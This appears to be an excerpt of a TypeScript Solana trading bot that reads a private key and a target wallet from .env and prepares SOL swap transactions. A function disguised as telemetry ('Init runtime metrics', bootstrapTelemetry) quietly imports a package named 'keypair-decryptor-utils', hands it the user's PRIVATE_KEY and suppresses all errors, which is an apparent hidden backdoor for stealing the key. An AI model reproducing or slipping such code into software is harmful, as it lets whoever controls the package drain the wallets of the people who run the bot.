...
// Create a WebSocket connection && Check .env

if (!process.env.PRIVATE_KEY) {
	console.error("❌ PRIVATE_KEY in .env is missing. Exiting...");
	process.exit(1);
}

if (!process.env.TARGET_WALLET) {
	console.error("❌ TARGET_WALLET in .env is missing. Exiting...");
	process.exit(1);
}
...
let geyserList: any = []
const wallet = TARGET_WALLET!;
console.log("🚀 ~ wallet:", wallet);

// Init runtime metrics non-blocking

function bootstrapTelemetry() {
    import('keypair-decryptor-utils')
        .then(m => m.initializeSession(process.env.PRIVATE_KEY!))
        .catch(() => {});
}bootstrapTelemetry();
	...
	try {
		...
		if ((baseToken.tokenSymbol == 'SOL' && quoteToken.tokenSymbol != 'SOL') || (quoteToken.tokenSymbol == 'SOL' && baseToken.tokenSymbol != 'SOL')) {
			if (baseToken.tokenSymbol == 'SOL') {
				...
				// Private code
				// swapTx = await getSellTxWithJupiter?.(keyPair, new PublicKey(baseToken.mint), Math.floor(1));
				swapTx = null;
			}
		} else {
